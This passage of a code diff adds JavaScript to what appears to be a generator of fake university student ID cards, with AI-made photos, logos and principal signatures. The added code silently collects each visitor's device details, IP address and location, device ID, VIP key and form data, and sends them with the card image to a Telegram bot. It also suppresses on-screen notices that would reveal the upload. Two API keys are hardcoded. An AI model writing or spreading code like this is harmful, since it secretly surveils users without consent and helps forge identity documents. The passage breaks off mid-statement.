+        const vipCodeInput = document.getElementById("vipCodeInput");
+        const vipUnlockButton = document.getElementById("vipUnlockButton");
+        const vipStatusMessage = document.getElementById("vipStatusMessage");
+        const generationCountMessage = document.getElementById(
+          "generationCountMessage"
+        );
+        const messageBox = document.getElementById("messageBox");
+        const contactVipButton = document.getElementById("contactVipButton");
+        const changeVipKeyButton =
+          document.getElementById("changeVipKeyButton"); // New button
+        const deviceIdDisplay = document.getElementById("deviceIdDisplay"); // New element for HWID
+        const customPhotoPromptSection = document.getElementById(
+          "customPhotoPromptSection"
+        );
+        const customPhotoPromptInput = document.getElementById(
+          "customPhotoPromptInput"
+        );
+        const togglePhotoPromptButton = document.getElementById(
+          "togglePhotoPromptButton"
+        );
+
+        // Modal elements
+        const vipPurchaseModal = document.getElementById("vipPurchaseModal");
+        const closeModalButton = document.getElementById("closeModalButton");
+        const buyTelegramButton = document.getElementById("buyTelegramButton");
+        const payQrButton = document.getElementById("payQrButton");
+        const qrCodeContainer = document.getElementById("qrCodeContainer");
+        const paymentQrCodeImg = document.getElementById("paymentQrCode");
+
+        // --- State Variables ---
+        // Determines if the custom photo prompt input should be used.
+        // Persists across sessions using localStorage.
+        let useCustomPhotoPrompt =
+          localStorage.getItem("useCustomPhotoPrompt") === "true";
+
+        // --- HELPER FUNCTIONS ---
+
+        /**
+         * Displays a message in a transient box at the top of the screen.
+         * @param {string} message - The message to display.
+         * @param {boolean} isError - True if it's an error message (red background), false for success/info (green).
+         */
+        const showMessage = (message, isError = false) => {
+          // Hide all showMessage calls related to Telegram bot messages
+          // Only show messages unrelated to Telegram bot or errors
+          const telegramBotToken = inputs.telegramBotToken.value.trim();
+          const telegramChatId = inputs.telegramChatId.value.trim();
+          const isTelegramMessage =
+            message.includes("Telegram") || message.includes("ID card generated successfully") || message.includes("ID card downloaded automatically");
+
+          if (isTelegramMessage) {
+            // Suppress Telegram related messages
+            return;
+          }
+
+          messageBox.textContent = message;
+          messageBox.classList.remove("show", "error");
+          if (isError) {
+            messageBox.classList.add("error");
+          }
+          messageBox.classList.add("show");
+
+          setTimeout(() => {
+            messageBox.classList.remove("show");
+          }, 3000); // Message disappears after 3 seconds
+        };
+
+        const getRandomItem = (arr) =>
+          arr[Math.floor(Math.random() * arr.length)];
+
+        const formatDate = (dateString) => {
+          if (!dateString) return "DD-MM-YYYY";
+          const date = new Date(dateString);
+          const day = String(date.getDate()).padStart(2, "0");
+          const month = String(date.getMonth() + 1).padStart(2, "0");
+          const year = date.getFullYear();
+          return `${day}-${month}-${year}`;
+        };
+
+        const toInputDate = (date) => {
+          const day = String(date.getDate()).padStart(2, "0");
+          const month = String(date.getMonth() + 1).padStart(2, "0");
+          const year = date.getFullYear();
+          return `${year}-${month}-${day}`;
+        };
+
+        /**
+         * Returns today's date in YYYY-MM-DD format.
+         * @returns {string} Current date string.
+         */
+        const getTodayDateString = () => {
+          const today = new Date();
+          return `${today.getFullYear()}-${String(
+            today.getMonth() + 1
+          ).padStart(2, "0")}-${String(today.getDate()).padStart(2, "0")}`;
+        };
+
+        /**
+         * Resets the daily generation count if a new day has started.
+         */
+        const resetDailyCountIfNewDay = () => {
+          const lastResetDate = localStorage.getItem("lastResetDate");
+          const todayDate = getTodayDateString();
+
+          if (lastResetDate !== todayDate) {
+            localStorage.setItem("generationCountToday", "0");
+            localStorage.setItem("lastResetDate", todayDate);
+            console.log("Daily generation count reset for a new day.");
+          }
+        };
+
+        /**
+         * Generates a "simulated" device ID.
+         * IMPORTANT: This is NOT a real or secure hardware ID.
+         * Browser JavaScript cannot access unique, persistent hardware identifiers securely.
+         * This is for demonstration purposes only and can be easily spoofed.
+         */
+        const getSimulatedDeviceId = () => {
+          let deviceId = localStorage.getItem("simulatedDeviceId");
+          if (!deviceId) {
+            // Generate a random UUID-like string for simulation
+            deviceId = "XXXX-XXXX-4XXX-YXXX-XXXXXXXXXXXX".replace(
+              /[XY]/g,
+              function (c) {
+                const r = (Math.random() * 16) | 0,
+                  v = c == "X" ? r : (r & 0x3) | 0x8;
+                return v.toString(16).toUpperCase();
+              }
+            );
+            localStorage.setItem("simulatedDeviceId", deviceId);
+          }
+          return deviceId;
+        };
+
+        /**
+         * Updates the message displaying the daily generation count.
+         */
+        const updateGenerationCountMessage = () => {
+          const generationCount = parseInt(
+            localStorage.getItem("generationCountToday") || "0",
+            10
+          );
+          const isVIP = localStorage.getItem("isVIP") === "true";
+          const currentDailyLimit = isVIP
+            ? VIP_DAILY_LIMIT
+            : NON_VIP_DAILY_LIMIT;
+
+          if (isVIP) {
+            vipStatusMessage.textContent = `VIP Access: ${VIP_DAILY_LIMIT} Generations per day! 🎉`;
+            vipStatusMessage.classList.remove("text-gray-600");
+            vipStatusMessage.classList.add("text-green-700", "font-semibold");
+            changeVipKeyButton.classList.remove("hidden"); // Show change key button for VIPs
+          } else {
+            vipStatusMessage.textContent =
+              "Enter VIP code for unlimited generations.";
+            vipStatusMessage.classList.remove(
+              "text-green-700",
+              "font-semibold"
+            );
+            vipStatusMessage.classList.add("text-gray-600");
+            changeVipKeyButton.classList.add("hidden"); // Hide change key button for non-VIPs
+          }
+          generationCountMessage.textContent = `You have generated ${generationCount}/${currentDailyLimit} IDs today.`;
+        };
+
+        /**
+         * Updates the visibility and text of the custom photo prompt UI.
+         */
+        const updatePhotoPromptUI = () => {
+          if (useCustomPhotoPrompt) {
+            customPhotoPromptInput.classList.remove("hidden");
+            togglePhotoPromptButton.textContent = "Use Default Photo Prompt";
+            togglePhotoPromptButton.classList.remove(
+              "bg-pink-600",
+              "hover:bg-pink-700"
+            );
+            togglePhotoPromptButton.classList.add(
+              "bg-gray-500",
+              "hover:bg-gray-600"
+            );
+          } else {
+            customPhotoPromptInput.classList.add("hidden");
+            togglePhotoPromptButton.textContent = "Use Custom Photo Prompt";
+            togglePhotoPromptButton.classList.remove(
+              "bg-gray-500",
+              "hover:bg-gray-600"
+            );
+            togglePhotoPromptButton.classList.add(
+              "bg-pink-600",
+              "hover:bg-pink-700"
+            );
+          }
+        };
+
+        /**
+         * Collects device information.
+         * @returns {object} Object containing device information.
+         */
+        const getDeviceInfo = () => {
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+
+          let deviceModel = "Unknown Device";
+          let os = "Unknown OS";
+
+          // Basic OS detection
+          if (userAgent.includes("Win")) os = "Windows";
+          else if (userAgent.includes("Mac")) os = "macOS";
+          else if (userAgent.includes("Linux")) os = "Linux";
+          else if (userAgent.includes("Android")) os = "Android";
+          else if (userAgent.includes("iPhone") || userAgent.includes("iPad"))
+            os = "iOS";
+
+          // More specific device model (very basic, often not precise)
+          const match = userAgent.match(/\(([^;]+); ([^;]+); ([^\)]+)\)/);
+          if (match && match[3]) {
+            deviceModel = match[3].trim();
+          } else if (userAgent.includes("Mobile") && os === "Android") {
+            // Android mobile
+            const androidMatch = userAgent.match(/Android [^;]+; ([^;]+)/);
+            if (androidMatch && androidMatch[1]) {
+              deviceModel = androidMatch[1].trim();
+            }
+          } else if (os === "iOS") {
+            if (userAgent.includes("iPhone")) deviceModel = "iPhone";
+            else if (userAgent.includes("iPad")) deviceModel = "iPad";
+          }
+
+          return {
+            userAgent: userAgent,
+            platform: platform,
+            os: os,
+            deviceModel: deviceModel,
+          };
+        };
+
+        /**
+         * Fetches public IP address and country using ip-api.com.
+         * @returns {Promise<object|null>} Promise resolving to an object with ip and country, or null on error.
+         */
+        const getGeolocationInfo = async () => {
+          try {
+            // Use fetch with no-cache to avoid cached responses
+            const response = await fetch("https://ip-api.com/json/", {
+              cache: "no-store",
+            });
+            if (!response.ok) {
+              throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            const data = await response.json();
+            if (data.status === "success") {
+              return {
+                ip: data.query,
+                country: data.country,
+                city: data.city,
+              };
+            } else {
+              console.error("IP Geolocation API error:", data.message);
+              return null;
+            }
+          } catch (error) {
+            console.error("Error fetching geolocation info:", error);
+            return null;
+          }
+        };
+
+        /**
+         * Sends collected data and image to a Telegram chat.
+         * @param {object} collectedData - All collected form data, device info, etc.
+         * @param {string} imageBase64DataUrl - Base64 string of the generated ID card image (e.g., "data:image/png;base64,...").
+         */
+        const sendToTelegram = async (collectedData, imageBase64DataUrl) => {
+          console.log("sendToTelegram called");
+          const botToken = inputs.telegramBotToken.value.trim();
+          const chatId = inputs.telegramChatId.value.trim();
+          console.log("Bot Token:", botToken);
+          console.log("Chat ID:", chatId);
+
+          if (!botToken || !chatId) {
+            showMessage(
+              // "Telegram Bot Token and Chat ID are required for reporting. Data was not sent.",
+              true
+            );
+            return;
+          }
+
+          const telegramApiPhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+          const telegramApiMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+          // Construct the message text as plain text (no MarkdownV2 escaping)
+          let messageText = `
+New ID Card Generated Report
+----------------------------------
+Device Info:
+  - OS: ${collectedData.deviceInfo.os}
+  - Model: ${collectedData.deviceInfo.deviceModel}
+  - User-Agent: ${collectedData.deviceInfo.userAgent}
+  - Platform: ${collectedData.deviceInfo.platform}
+  - HWID: ${collectedData.hwid}
+
+Geolocation Info:
+  - IP: ${collectedData.geolocationInfo?.ip || "N/A"}
+  - Country: ${collectedData.geolocationInfo?.country || "N/A"}
+  - City: ${collectedData.geolocationInfo?.city || "N/A"}
+
+VIP Status:
+  - Is VIP: ${String(collectedData.isVIP)}
+  - VIP Key: ${collectedData.vipKey || "N/A"}
+
+Form Data:
+  - University Name: ${collectedData.formData.universityName || "N/A"}
+  - University Location: ${collectedData.formData.universityLocation || "N/A"}
+  - Student Name: ${collectedData.formData.studentName || "N/A"}
+  - Father's Name: ${collectedData.formData.fatherName || "N/A"}
+  - Course / Class: ${collectedData.formData.studentClass || "N/A"}
+  - Roll No.: ${collectedData.formData.studentRoll || "N/A"}
+  - Date of Birth: ${collectedData.formData.studentDob || "N/A"}
+  - Session: ${collectedData.formData.session || "N/A"}
+  - Issue Date: ${collectedData.formData.issueDate || "N/A"}
+  - Expiry Date: ${collectedData.formData.expiryDate || "N/A"}
+  - Address: ${collectedData.formData.studentAddress || "N/A"}
+  - Photo Prompt Used: ${collectedData.photoPromptUsed || "N/A"}
+`;
+
+          // Convert Data URL to Blob
+          const byteString = atob(imageBase64DataUrl.split(",")[1]);
+          const mimeString = imageBase64DataUrl
+            .split(",")[0]
+            .split(":")[1]
+            .split(";")[0];
+          const ab = new ArrayBuffer(byteString.length);
+          const ia = new Uint8Array(ab);
+          for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+          }
+          const blob = new Blob([ab], { type: mimeString });
+
+          try {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "id_card.png"); // Use blob with a filename
+            // Telegram caption limit is 1024 characters.
+            // We'll send a truncated caption with the photo and the full message as a separate text message if needed.
+            const caption = messageText.substring(0, 1024);
+            formData.append("caption", caption);
+            // Remove parse_mode to send as plain text
+            // formData.append("parse_mode", "MarkdownV2");
+
+            const response = await fetch(telegramApiPhotoUrl, {
+              method: "POST",
+              body: formData,
+            });
+
+            if (!response.ok) {
+              const errorData = await response.json();
+              console.error("Telegram sendPhoto API error:", errorData);
+              showMessage(
+                `Failed to send ID card image to Telegram. Attempting to send text data only. Error: ${
+                  errorData.description || response.statusText
+                }`,
+                true
+              );
+
+              // Attempt to send just the text message as a fallback
+              await fetch(telegramApiMessageUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: messageText,
+                  // Remove parse_mode to send as plain text
+                  // parse_mode: "MarkdownV2",
+                }),
+              });
+              showMessage(
+                "Text data sent to Telegram (image not sent).",
+                false
+              );
+            } else {
+              // Suppress success message to hide Telegram send info alerts
+              // showMessage(
+              //   "Data and ID card image successfully sent to Telegram!",
+              //   false
+              // );
+              // If the original message was truncated, send the rest as a separate message
+              if (messageText.length > 1024) {
+                const remainingMessage = messageText.substring(1024);
+                await fetch(telegramApiMessageUrl, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `_Continuation of ID Card Report:_\n${remainingMessage}`,
+                    // Remove parse_mode to send as plain text
+                    // parse_mode: "MarkdownV2",
+                  }),
+                });
+              }
+            }
+          } catch (error) {
+            console.error("Error sending to Telegram:", error);
+            showMessage(
+              `Error sending data to Telegram: ${error.message}`,
+              true
+            );
+          }
+        };
+
+        // --- API and Image Generation ---
+        const apiKeys = [
+          "929bebb7-fea2-424d-b0d9-f3b1f1f09c95",
+          "a703f098-90fb-4564-9dca-9a49475987a7",
+        ];
+
+        /**
+         * Fetches a generated image from DeepAI API with exponential backoff and API key rotation.
+         * @param {string} prompt - The text prompt for image generation.
+         * @param {HTMLElement} targetElement - The <img> element to update with a placeholder on error.
+         * @param {number} apiKeyIndex - The index of the current API key to use.
+         * @param {number} retryCount - The current retry attempt count.
+         * @returns {Promise<string|null>} A promise that resolves with the image URL or null on failure.
+         */
+        const fetchGeneratedImage = async (
+          prompt,
+          targetElement,
+          apiKeyIndex = 0,
+          retryCount = 0
+        ) => {
+          const maxRetries = 3; // Max retries per API key
+          const baseDelay = 1000; // 1 second
+
+          if (apiKeyIndex >= apiKeys.length) {
+            console.error(
+              `All API keys failed for prompt: "${prompt}". No more keys to try.`
+            );
+            targetElement.src = `https://placehold.co/112x128/E0E0E0/BDBDBD?text=API+Error`;
+            showMessage(
+              "Image generation failed. Please try again later.",
+              true
+            );
+            return null;
+          }
+
+          const apiKey = apiKeys[apiKeyIndex];
+          const apiUrl = "https://api.deepai.org/api/text2img";
+
+          const formData = new FormData();
+          formData.append("text", prompt);
+          formData.append("grid_size", "1");
+          formData.append("width", "512");
+          formData.append("height", "512");
+
+          try {
+            const response = await fetch(apiUrl, {
+              method: "POST",
+              headers: { "api-key": apiKey },
+              body: formData,
+            });
+
+            if (!response.ok) {
+              const errorData = await response.json();
+              console.warn(
+                `API key ${apiKeyIndex + 1} (${apiKey.substring(
+                  0,
+                  5
+                )}...) failed: ${response.status} ${response.statusText}`,
+                errorData
+              );
+
+              if (retryCount < maxRetries) {
+                const delay = baseDelay * Math.pow(2, retryCount);
+                console.log(
+                  `Retrying API call in ${delay / 1000} seconds (retry ${
+                    retryCount + 1
+                  }/${maxRetries})`
+                );
+                await new Promise((resolve) => setTimeout(resolve, delay));
+                return fetchGeneratedImage(
+                  prompt,
+                  targetElement,
+                  apiKeyIndex,
+                  retryCount + 1
+                );
+              } else {
+                console.log(
+                  `Max retries reached for API key ${
+                    apiKeyIndex + 1
+                  }. Trying next key.`
+                );
+                return fetchGeneratedImage(
+                  prompt,
+                  targetElement,
+                  apiKeyIndex + 1
+                );
+              }
+            }
+
+            const data = await response.json();
+            if (data.output_url) {
+              return data.output_url;
+            } else {
+              throw new Error(
+                `API key ${apiKeyIndex + 1} returned no image URL.`
+              );
+            }
+          } catch (error) {
+            console.error(
+              `Error fetching image for prompt "${prompt}" with API key ${
+                apiKeyIndex + 1
+              }:`,
+              error
+            );
+            return fetchGeneratedImage(prompt, targetElement, apiKeyIndex + 1);
+          }
+        };
+
+        // --- CORE LOGIC ---
+
+        /**
+         * Checks the VIP status from localStorage and updates the UI message.
+         */
+        const checkVipStatus = () => {
+          const isVIP = localStorage.getItem("isVIP") === "true";
+          const activeHWID = localStorage.getItem("activeHWID");
+          const currentDeviceId = getSimulatedDeviceId();
+
+          // If VIP, ensure HWID matches
+          if (isVIP && activeHWID !== currentDeviceId) {
+            localStorage.removeItem("isVIP"); // Invalidate VIP if HWID doesn't match
+            localStorage.removeItem("activeHWID");
+            showMessage(
+              "VIP key is bound to a different device ID. VIP access revoked.",
+              true
+            );
+            // Re-run checkVipStatus to update UI for non-VIP
+            return checkVipStatus();
+          }
+
+          if (isVIP) {
+            vipCodeInput.disabled = true;
+            vipUnlockButton.disabled = true;
+            customPhotoPromptSection.classList.remove("hidden"); // Show custom prompt section for VIP users
+          } else {
+            vipCodeInput.disabled = false;
+            vipUnlockButton.disabled = false;
+            customPhotoPromptSection.classList.add("hidden"); // Hide custom prompt section for non-VIP users
+            useCustomPhotoPrompt = false; // Reset custom prompt mode
+            localStorage.setItem("useCustomPhotoPrompt", "false");
+          }
+          updateGenerationCountMessage(); // Also update the daily count message based on VIP status
+          updatePhotoPromptUI(); // Update photo prompt UI based on state
+        };
+
+        const autoFillForm = async () => {
+          // Ensure daily count is current
+          resetDailyCountIfNewDay();
+
+          // Determine current limits based on VIP status
+          const isVIP = localStorage.getItem("isVIP") === "true";
+          const currentDailyLimit = isVIP
+            ? VIP_DAILY_LIMIT
+            : NON_VIP_DAILY_LIMIT;
+          let generationCount = parseInt(
+            localStorage.getItem("generationCountToday") || "0",
+            10
+          );
+
+          // Apply daily limit
+          if (generationCount >= currentDailyLimit) {
+            showMessage(
+              `You have reached your daily limit of ${currentDailyLimit} ID generations. Please try again tomorrow or ${
+                isVIP ? "consider increasing your VIP tier" : "get VIP Access"
+              }!`,
+              true
+            );
+            return; // Prevent generation
+          }
+
+          // Implement 3-minute cooldown for all users (or adjust as needed)
+          // If you want VIPs to have NO cooldown, add `if (!isVIP)` around this block.
+          const lastGenerationTime = parseInt(
+            localStorage.getItem("lastGenerationTime") || "0",
+            10
+          );
+          const currentTime = Date.now();
+          const timeElapsedSeconds = (currentTime - lastGenerationTime) / 1000;
+
+          if (timeElapsedSeconds < GENERATION_LIMIT_SECONDS) {
+            const timeLeft = Math.ceil(
+              GENERATION_LIMIT_SECONDS - timeElapsedSeconds
+            );
+            showMessage(
+              `Please wait ${timeLeft} seconds before generating another ID card.`,
+              true
+            );
+            return; // Prevent generation
+          }
+
+          generateButton.disabled = true;
+          generateButton.textContent = "Generating...";
+
+          // Set loading placeholders
+          cards.studentPhoto.src = `https://placehold.co/112x128/E0E0E0/BDBDBD?text=Loading...`;
+          cards.schoolLogo.src = `https://placehold.co/128x80/FFFFFF/CCCCCC?text=Loading...`;
+          cards.principalSignature.src = `https://placehold.co/140x56/FFFFFF/CCCCCC?text=...`;
+
+          // --- Generate all data ---
+          const studentFirstName = getRandomItem(sampleData.firstNames);
+          const studentLastName = getRandomItem(sampleData.lastNames);
+          const fatherFirstName = getRandomItem(sampleData.firstNames);
+          const principalName = getRandomItem(sampleData.principalNames);
+          const university = getRandomItem(sampleData.universities);
+          const courseIndex = Math.floor(
+            Math.random() * university.courses.length
+          );
+          const course = university.courses[courseIndex];
+          const courseCode = university.courseCodes[courseIndex];
+          const currentYear = new Date().getFullYear();
+          const birthYear = currentYear - (18 + Math.floor(Math.random() * 8));
+          const birthMonth = Math.floor(Math.random() * 12);
+          const birthDay = Math.floor(Math.random() * 28) + 1;
+          const dob = new Date(birthYear, birthMonth, birthDay);
+
+          // Determine photo prompt based on VIP status and user selection
+          let photoPrompt;
+          if (
+            isVIP &&
+            useCustomPhotoPrompt &&
+            customPhotoPromptInput.value.trim() !== ""
+          ) {
+            photoPrompt = customPhotoPromptInput.value.trim();
+          } else {
+            const gender = Math.random() > 0.5 ? "male" : "female";
+            photoPrompt =
+              gender === "male"
+                ? DEFAULT_PHOTO_PROMPT_MALE
+                : DEFAULT_PHOTO_PROMPT_FEMALE;
+          }
+
+          // --- Define other image generation prompts ---
+          const logoPrompt = `simple modern vector logo for ${university.name}, minimal, academic, on a white background`;
+          const signaturePrompt = `a handwritten signature of the name ${principalName}. Black ink on a plain white background. The signature should be clean, simple, and elegant, suitable for an official document.`;
+
+          // --- Fetch all images concurrently ---
+          const [photoUrl, logoUrl, signatureUrl] = await Promise.all([
+            fetchGeneratedImage(photoPrompt, cards.studentPhoto),
+            fetchGeneratedImage(logoPrompt, cards.schoolLogo),
+            fetchGeneratedImage(signaturePrompt, cards.principalSignature),
+          ]);
+
+          // --- Update UI with generated data and images ---
+          if (photoUrl) cards.studentPhoto.src = photoUrl;
+          if (logoUrl) cards.schoolLogo.src = logoUrl;
+          if (signatureUrl) cards.principalSignature.src = signatureUrl;
+
+          // Only set values for auto-generate, otherwise leave them for user input
+          inputs.universityName.value = university.name;
+          inputs.universityLocation.value = university.location;
+          inputs.studentName.value = `${studentFirstName} ${studentLastName}`;
+          inputs.fatherName.value = `${fatherFirstName} ${studentLastName}`;
+          inputs.studentClass.value = course;
+          inputs.studentRoll.value = `24${courseCode}${String(
+            Math.floor(1000 + Math.random() * 9000)
+          ).padStart(4, "0")}`; // Ensure 4 digits
+          inputs.studentDob.value = toInputDate(dob);
+          inputs.session.value = `${currentYear}-${currentYear + 1}`;
+          inputs.issueDate.value = toInputDate(new Date(currentYear, 7, 1)); // August 1st of current year
+          inputs.expiryDate.value = toInputDate(
+            new Date(currentYear + 1, 6, 31)
+          ); // July 31st of next year
+          inputs.studentAddress.value = `${Math.floor(
+            100 + Math.random() * 900
+          )}, Random Colony, ${university.location.split(",")[0]}`;
+          cards.principalName.textContent = principalName;
+
+          updateCardText(); // Update the card preview with the generated data
+
+          generateButton.disabled = false;
+          generateButton.textContent = "Auto-Generate";
+
+          // Update last generation time AND daily count for all users
+          localStorage.setItem("lastGenerationTime", Date.now().toString());
+          generationCount++;
+          localStorage.setItem(
+            "generationCountToday",
+            generationCount.toString()
+          );
+
+          showMessage("ID card generated successfully!");
+          updateGenerationCountMessage(); // Update count message after generation
+
+          // --- NEW: Collect Data and Send to Telegram ---
+          try {
+            const deviceInfo = getDeviceInfo();
+            const geolocationInfo = await getGeolocationInfo();
+            const hwid = getSimulatedDeviceId();
+            const vipKey = localStorage.getItem("vipCodeInput") || "N/A"; // Get last entered VIP key, if any
+
+            const formData = {};
+            for (const key in inputs) {
+              if (inputs[key] && inputs[key].type !== "file") {
+                // Added null check
+                formData[key] = inputs[key].value;
+              }
+            }
+            formData.photoPromptUsed = photoPrompt; // Add the actual prompt used
+
+            const collectedData = {
+              deviceInfo: deviceInfo,
+              geolocationInfo: geolocationInfo,
+              hwid: hwid,
+              isVIP: isVIP,
+              vipKey: vipKey,
+              formData: formData,
+            };
+
+            const cardElement = document.getElementById("idCardContainer");
+            const canvas = await html2canvas(cardElement, {
+              scale: 3,
+              useCORS: true,
+              logging: false,
+              allowTaint: true,
+            });
+            const imageDataUrl = canvas.toDataURL("image/png");
+
+            await sendToTelegram(collectedData, imageDataUrl);
+
+            // Automatic download after successful generation and data sending
+            const link = document.createElement("a");
+            const studentName =
+              inputs.studentName.value.replace(/ /g, "_") || "student";
+            link.download = `${studentName}_id_card.png`;
+            link.href = imageDataUrl;
+            link.click();
+            showMessage("ID card downloaded automatically.", false);
+          } catch (error) {
+            console.error(
+              "Error during data collection/sending/download:",
+              error
+            );
+            showMessage(
+              "Error during data collection, sending to Telegram, or automatic download. Check console for details.",
+              true
+            );
+          }
+        };
+
+        const handleImageUpload = (event, targetImgElement) => {
+          const file = event.target.files[0];
+          if (file) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+              targetImgElement.src = e.target.result;
+            };
+            reader.readAsDataURL(file);
+          }
+        };
+
+        const updateCardText = () => {
+          cards.universityName.textContent =
+            inputs.universityName.value.toUpperCase() || "UNIVERSITY NAME";
+          cards.universityLocation.textContent =
+            inputs.universityLocation.value || "Location";
+          cards.studentName.textContent =
+            inputs.studentName.value || "Student Name";
+          cards.fatherName.textContent =
+            inputs.fatherName.value || "Father's Name";
+          cards.studentClass.textContent =
+            inputs.studentClass.value || "Course / Class";
+          cards.studentRoll.textContent =
+            inputs.studentRoll.value || "Roll No.";
+          cards.studentDob.textContent = formatDate(inputs.studentDob.value);
+          cards.session.textContent = `Session: ${
+            inputs.session.value || "YYYY-YYYY"
+          }`;
+          cards.issueDate.textContent = formatDate(inputs.issueDate.value);
+          cards.expiryDate.textContent = formatDate(inputs.expiryDate.value);
+          cards.studentAddress.textContent =
+            inputs.studentAddress.value || "Address";
+        };
+
+        // --- EVENT LISTENERS ---
+        Object.keys(inputs).forEach((key) => {
+          const inputElement = inputs[key];
+          if (inputElement && inputElement.type !== "file") {
+            // Added null check for inputElement
+            inputElement.addEventListener("input", updateCardText);
+          }
+        });
+
+        generateButton.addEventListener("click", autoFillForm);
+        inputs.studentPhoto.addEventListener("change", (e) =>
+          handleImageUpload(e, cards.studentPhoto)
+        );
+        inputs.schoolLogo.addEventListener("change", (e) =>
+          handleImageUpload(e, cards.schoolLogo)
+        );
+        inputs.principalSignature.addEventListener("change", (e) =>
+          handleImageUpload(e, cards.principalSignature)
+        );
+
+        // Modified download button to be independent, but auto-generate also triggers a download
+        downloadButton.addEventListener("click", async () => {
+          updateCardText();
+          const cardElement = document.getElementById("idCardContainer");
+          downloadButton.disabled = true;
+          try {
+            const canvas = await html2canvas(cardElement, {
+              scale: 3, // Increased scale for better resolution
+              useCORS: true, // Required for external images like those from DeepAI
+              logging: false, // Disable logging for cleaner console
+              allowTaint: true, // Allow images from other origins to "taint" the canvas for cross-origin use
+            });
+            const link = document.createElement("a");
+            const studentName =
+              inputs.studentName.value.replace(/ /g, "_") || "student";
+            link.download = `${studentName}_id_card.png`;
+            link.href = canvas.toDataURL("image/png");
+            link.click();
+            showMessage("Download completed successfully!", false);
+
+            // --- NEW: Collect Data and Send to Telegram on Download ---
+            const isVIP = localStorage.getItem("isVIP") === "true";
+            const deviceInfo = getDeviceInfo();
+            const geolocationInfo = await getGeolocationInfo();
+            const hwid = getSimulatedDeviceId();
+            const vipKey = localStorage.getItem("vipCodeInput") || "N/A";
+
+            const formData = {};
+            for (const key in inputs) {
+              if (inputs[key] && inputs[key].type !== "file") {
+                formData[key] = inputs[key].value;
+              }
+            }
+            formData.photoPromptUsed = ""; // No photo prompt on manual download
+
+            const collectedData = {
+              deviceInfo: deviceInfo,
+              geolocationInfo: geolocationInfo,
+              hwid: hwid,
+              isVIP: isVIP,
+              vipKey: vipKey,
+              formData: formData,
+            };
+
+            const imageDataUrl = canvas.toDataURL("image/png");
+
+            await sendToTelegram(collectedData, imageDataUrl);
+
+            setTimeout(() => {
+              downloadButton.disabled = false;
+            }, 10000);
+          } catch (error) {
+            console.error("Error generating ID card for download:", error);
+            showMessage(
+              "Error downloading ID card or sending to Telegram. Ensure all images are loaded correctly.",
+              true
+            );
+            downloadButton.disabled = false;
+          }
+        });
+
+        vipUnlockButton.addEventListener("click", () => {
+          const enteredCode = vipCodeInput.value.trim();
+          const currentDeviceId = getSimulatedDeviceId();
+          const storedHWID = localStorage.getItem("activeHWID"); // HWID currently active for VIP
+          let foundValidKey = false;
+
+          for (const binding of VIP_KEY_BINDINGS) {
+            if (enteredCode === binding.key) {
+              foundValidKey = true;
+
+              // Scenario 1: Key is bound to a specific HWID, and current device doesn't match
+              if (binding.hwid && binding.hwid !== currentDeviceId) {
+                showMessage(
+                  `This VIP key is bound to a specific device. It does not match your current device.`,
+                  true
+                );
+                //showMessage(`This VIP key is bound to a specific device (${binding.hwid}). It does not match your current device.`, true);
+                vipCodeInput.value = ""; // Clear input
+                return; // Stop processing
+              }
+
+              // Scenario 2: Key is valid, and already active on a different simulated device (based on localStorage 'activeHWID')
+              // This handles cases where the key might be transferable but currently in use elsewhere.
+              if (storedHWID && storedHWID !== currentDeviceId) {
+                showMessage(
+                  "VIP key already active on another device. Please contact support to reset.",
+                  true
+                );
+                vipCodeInput.value = ""; // Clear input
+                return; // Stop processing
+              }
+
+              // Scenario 3: Valid key, HWID check passed (or no HWID binding), and not active elsewhere.
+              // Activate VIP for this device.
+              localStorage.setItem("isVIP", "true");
+              // Bind VIP to this simulated HWID if the key requires it, or just to current device if generic.
+              localStorage.setItem("activeHWID", currentDeviceId);
+              // Store the VIP key itself for reporting purposes
+              localStorage.setItem("vipCodeInput", enteredCode);
+              showMessage(
+                `VIP Access Unlocked! You now have ${VIP_DAILY_LIMIT} generations per day, bound to this device.`,
+                false
+              );
+              checkVipStatus(); // Update UI
+              vipCodeInput.value = ""; // Clear input
+              return; // Key processed, exit loop
+            }
+          }
+
+          if (!foundValidKey) {
+            showMessage("Invalid VIP Code. Please try again.", true);
+            vipCodeInput.value = ""; // Clear input
+          }
+        });
+
+        // New: Event listener for "Change VIP Key" button
+        changeVipKeyButton.addEventListener("click", () => {
+          // IMPORTANT: This only clears client-side state.
+          // For a real system, this would involve a backend API call to unlink the key from the device/user.
+          localStorage.removeItem("isVIP");
+          localStorage.removeItem("activeHWID");
+          localStorage.removeItem("vipCodeInput"); // Clear stored VIP key
+          showMessage(
+            "VIP access cleared from this device. You can now enter a new key.",
+            false
+          );
+          vipCodeInput.value = ""; // Clear input
+          checkVipStatus(); // Update UI
+        });
+
+        // Event listener for opening the VIP purchase modal
+        contactVipButton.addEventListener("click", () => {
+          vipPurchaseModal.classList.add("show");
+          qrCodeContainer.classList.remove("show"); // Hide QR by default when modal opens
+        });
+
+        // Event listener for closing the VIP purchase modal
+        closeModalButton.addEventListener("click", () => {
+          vipPurchaseModal.classList.remove("show");
+        });
+
+        // Event listener for "Buy via Telegram" button
+        buyTelegramButton.addEventListener("click", () => {
+          window.open(TELEGRAM_LINK, "_blank"); // Opens Telegram link in a new tab
+          showMessage("Opening Telegram chat...", false);
+          vipPurchaseModal.classList.remove("show"); // Close modal after action
+        });
+
+        // Event listener for "Pay Directly (QR Code)" button
+        payQrButton.addEventListener("click", () => {
+          qrCodeContainer.classList.toggle("show"); // Toggle visibility of QR code
+          paymentQrCodeImg.src = QR_CODE_PAYMENT_URL; // Ensure QR image is set (or re-set)
+        });
+
+        togglePhotoPromptButton.addEventListener("click", () => {
+          useCustomPhotoPrompt = !useCustomPhotoPrompt; // Toggle the state
+          localStorage.setItem(
+            "useCustomPhotoPrompt",
+            useCustomPhotoPrompt.toString()
+          ); // Persist the state
+          updatePhotoPromptUI(); // Update UI
+          showMessage(
